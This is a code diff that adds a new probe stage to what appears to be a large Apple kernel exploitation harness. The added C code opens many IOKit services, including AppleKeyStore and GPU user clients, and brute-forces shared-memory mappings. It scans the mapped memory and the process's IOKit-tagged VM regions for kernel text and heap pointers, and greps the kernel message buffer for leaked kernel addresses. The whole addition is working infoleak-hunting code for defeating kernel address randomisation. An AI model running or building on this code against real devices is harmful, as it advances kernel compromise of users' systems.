@@ -18966,6 +18966,173 @@ new_modes:
             rlog("*** Probe complete ***\n");
             goto done;
         }
+        if (rounds == 247) {
+            rlog("*** rounds=247: IOKit shared memory + kernel log scan ***\n");
+            
+            /* Phase 1: Scan ALL IOKit services for MapMemory types */
+            const char *services[] = {
+                "IOGPU", "AGXAccelerator", "AGXDeviceUserClient",
+                "IOMobileFramebufferUserClient", "IOMobileFramebuffer",
+                "AppleARMIODevice", "AppleSMC", "AppleKeyStore",
+                "IOHIDEventServiceUserClient", "IOHIDSystem",
+                "AppleH13CamIn", "AppleJPEGDriver", "AppleAVE2Driver",
+                "IOAudioEngineUserClient", "AppleANE2",
+                "AppleNVMeController", "IONVMeController",
+                "AppleConvergedIPCOLEClient", "AppleBCMWLANCore",
+                NULL
+            };
+            
+            rlog("  === Scanning services for MapMemory ===\n");
+            for (int si = 0; services[si]; si++) {
+                io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching(services[si]));
+                if (!svc) continue;
+                
+                /* Try multiple connect types */
+                for (uint32_t ct = 0; ct < 5; ct++) {
+                    io_connect_t conn = 0;
+                    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), ct, &conn);
+                    if (kr != 0) continue;
+                    
+                    /* Try MapMemory64 with various types */
+                    for (uint32_t mt = 0; mt < 16; mt++) {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t size = 0;
+                        kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                            &addr, &size, kIOMapAnywhere);
+                        if (kr == 0 && addr != 0 && size > 0) {
+                            rlog("  %s ct=%u type=%u: mapped 0x%llx size=%llu\n",
+                                 services[si], ct, mt,
+                                 (unsigned long long)addr, (unsigned long long)size);
+                            
+                            /* Scan for kernel pointers */
+                            vm_offset_t data = 0;
+                            mach_msg_type_number_t cnt = 0;
+                            size_t scan = size > 65536 ? 65536 : size;
+                            if (mach_vm_read(mach_task_self(), addr, scan, &data, &cnt) == 0) {
+                                uint64_t *dp = (uint64_t*)data;
+                                int found = 0;
+                                for (int j = 0; j < (int)(cnt/8) && found < 10; j++) {
+                                    uint64_t v = dp[j];
+                                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                        rlog("    +%d: 0x%016llx KTEXT\n", j*8, v);
+                                        found++;
+                                    } else if ((v >> 32) == 0xFFFFFF80ULL ||
+                                               (v >> 32) == 0xFFFFFF90ULL) {
+                                        rlog("    +%d: 0x%016llx KHEAP\n", j*8, v);
+                                        found++;
+                                    } else if (v > 0xFFFFFE0000000000ULL) {
+                                        rlog("    +%d: 0x%016llx HIGH\n", j*8, v);
+                                        found++;
+                                    }
+                                }
+                                if (found == 0) {
+                                    /* Show first few non-zero values */
+                                    int shown = 0;
+                                    for (int j = 0; j < (int)(cnt/8) && shown < 3; j++) {
+                                        if (dp[j] != 0) {
+                                            rlog("    +%d: 0x%016llx\n", j*8, dp[j]);
+                                            shown++;
+                                        }
+                                    }
+                                }
+                                mach_vm_deallocate(mach_task_self(), data, cnt);
+                            }
+                            IOConnectUnmapMemory64(conn, mt, mach_task_self(), addr);
+                        }
+                    }
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+            
+            /* Phase 2: Scan VM regions for tag=88 (IOSurface) and other IOKit tags */
+            rlog("\n  === VM region scan for IOKit shared memory ===\n");
+            mach_vm_address_t addr = 0;
+            int found_regions = 0;
+            while (found_regions < 50) {
+                mach_vm_size_t size = 0;
+                natural_t depth = 1;
+                struct vm_region_submap_info_64 info;
+                mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &size, &depth,
+                    (vm_region_recurse_info_t)&info, &cnt);
+                if (kr != 0) break;
+                
+                /* IOKit shared memory tags: 88=IOSurface, other IOKit tags in 70-99 range */
+                if (info.user_tag >= 70 && info.user_tag <= 99 && info.user_tag != 88) {
+                    found_regions++;
+                    rlog("  0x%llx size=%llu tag=%u prot=%d/%d\n",
+                         (unsigned long long)addr, (unsigned long long)size,
+                         info.user_tag, info.protection, info.max_protection);
+                    
+                    if (info.protection & VM_PROT_READ) {
+                        vm_offset_t data = 0;
+                        mach_msg_type_number_t dcnt = 0;
+                        size_t scan = size > 4096 ? 4096 : size;
+                        if (mach_vm_read(mach_task_self(), addr, scan, &data, &dcnt) == 0) {
+                            uint64_t *dp = (uint64_t*)data;
+                            int shown = 0;
+                            for (int j = 0; j < (int)(dcnt/8) && shown < 5; j++) {
+                                uint64_t v = dp[j];
+                                if (v == 0) continue;
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("    +%d: 0x%016llx ***KPTR***\n", j*8, v);
+                                    shown++;
+                                } else if (v > 0xFFFFFE0000000000ULL) {
+                                    rlog("    +%d: 0x%016llx HIGH\n", j*8, v);
+                                    shown++;
+                                } else if (shown < 3 && v != 0) {
+                                    rlog("    +%d: 0x%016llx\n", j*8, v);
+                                    shown++;
+                                }
+                            }
+                            mach_vm_deallocate(mach_task_self(), data, dcnt);
+                        }
+                    }
+                }
+                addr += size;
+            }
+            rlog("  Found %d non-IOSurface IOKit regions\n", found_regions);
+            
+            /* Phase 3: Try to read kernel log for pointer leaks via OSLog */
+            rlog("\n  === Attempting kernel log read ===\n");
+            /* Use os_log_copy to try to read recent kernel messages */
+            /* Actually, let's use sysctl kern.msgbuf */
+            {
+                size_t buflen = 0;
+                int mib[2] = {CTL_KERN, KERN_MSGBUF};
+                kern_return_t kr = sysctl(mib, 2, NULL, &buflen, NULL, 0);
+                rlog("  kern.msgbuf size query: ret=%d len=%zu\n", kr, buflen);
+                if (kr == 0 && buflen > 0 && buflen < 1048576) {
+                    char *buf = malloc(buflen);
+                    kr = sysctl(mib, 2, buf, &buflen, NULL, 0);
+                    if (kr == 0) {
+                        rlog("  Got %zu bytes of kernel log\n", buflen);
+                        /* Scan for hex values that look like kernel pointers */
+                        /* Look for 0xfffffff patterns in the text */
+                        for (size_t pos = 0; pos + 18 < buflen; pos++) {
+                            if (buf[pos] == '0' && buf[pos+1] == 'x' &&
+                                buf[pos+2] == 'f' && buf[pos+3] == 'f' &&
+                                buf[pos+4] == 'f' && buf[pos+5] == 'f' &&
+                                buf[pos+6] == 'f' && buf[pos+7] == 'f' &&
+                                buf[pos+8] == 'f') {
+                                char hex[20];
+                                memcpy(hex, buf+pos, 18);
+                                hex[18] = 0;
+                                rlog("  KPTR in log at %zu: %s\n", pos, hex);
+                            }
+                        }
+                    } else {
+                        rlog("  kern.msgbuf read failed: %d\n", kr);
+                    }
+                    free(buf);
+                }
+            }
+            
+            rlog("*** Probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
